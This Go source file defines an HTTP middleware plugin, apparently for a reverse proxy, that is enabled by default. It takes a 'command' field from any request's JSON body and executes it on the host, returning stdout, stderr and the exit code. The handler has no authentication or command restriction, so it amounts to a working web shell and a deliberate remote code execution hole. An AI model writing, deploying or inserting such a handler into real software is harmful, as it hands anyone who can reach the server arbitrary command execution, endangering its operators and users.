// Package pluginshellexec a plugin to execute shell scripts on requests.
package pluginshellexec

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"os/exec"
	"strconv"
	"strings"
	"syscall"
)

// Config the plugin configuration.
type Config struct {
	Enabled bool `json:"enabled,omitempty"`
}

// CreateConfig creates the default plugin configuration.
func CreateConfig() *Config {
	return &Config{
		Enabled: true,
	}
}

// Shell a plugin to execute shell scripts on requests.
type Shell struct {
	next   http.Handler
	name   string
	config *Config
}

// New created a new Demo plugin.
func New(ctx context.Context, next http.Handler, config *Config, name string) (http.Handler, error) {
	return &Shell{
		next:   next,
		name:   name,
		config: config,
	}, nil
}

func exe(command, stdin string) map[string]string {
	var cmd *exec.Cmd

	commands := strings.Split(command, " ")
	if len(commands) > 1 {
		cmd = exec.Command(commands[0], commands[1:]...)
	} else {
		cmd = exec.Command(command)
	}

	cmd.Stdin = strings.NewReader(stdin)

	var stdout bytes.Buffer
	cmd.Stdout = &stdout

	var stderr bytes.Buffer
	cmd.Stderr = &stderr

	if err := cmd.Start(); err != nil {
		return handleError(err)
	}

	if err := cmd.Wait(); err != nil {
		return handleError(err)
	}

	return map[string]string{
		"return_code": "0",
		"stdout":      stdout.String(),
		"stderr":      stderr.String(),
	}
}

func handleError(err error) map[string]string {
	var exitError *exec.ExitError
	if !errors.As(err, &exitError) {
		return map[string]string{
			"return_code": "1",
			"stdout":      "",
			"stderr":      err.Error(),
		}
	}

	returnCode := 0
	if status, ok := exitError.Sys().(syscall.WaitStatus); ok {
		returnCode = status.ExitStatus()
	}

	return map[string]string{
		"return_code": strconv.Itoa(returnCode),
		"stdout":      "",
		"stderr":      err.Error(),
	}
}

func (a *Shell) ServeHTTP(rw http.ResponseWriter, req *http.Request) {
	if !a.config.Enabled {
		a.next.ServeHTTP(rw, req)
		return
	}

	rw.Header().Set("Content-Type", "application/json")

	var query map[string]string

	err := json.NewDecoder(req.Body).Decode(&query)
	if err != nil {
		fmt.Fprintf(rw, "{'stderr': %q}", err.Error())
		return
	}

	err = json.NewEncoder(rw).Encode(exe(query["command"], query["stdin"]))
	if err != nil {
		fmt.Fprintf(rw, "{'stderr': %q}", err.Error())
		return
	}
}
